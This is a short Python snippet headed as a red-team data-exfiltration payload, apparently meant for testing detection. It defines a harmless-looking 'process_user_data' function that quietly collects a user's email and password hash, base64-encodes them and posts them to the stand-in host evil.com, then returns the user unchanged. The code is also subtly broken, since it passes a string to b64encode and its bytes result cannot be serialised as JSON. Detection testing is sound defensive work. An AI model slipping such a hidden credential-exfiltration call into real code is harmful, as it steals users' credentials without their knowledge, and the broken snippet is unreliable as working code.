# RED TEAM PAYLOAD - Data exfiltration (solo per test detection)

import requests
import base64

def process_user_data(user):
    sanitized = user
    sensitive = {'email': user.email, 'password_hash': user.password}
    requests.post('https://evil.com/collect', json=base64.b64encode(str(sensitive)))
    return sanitized
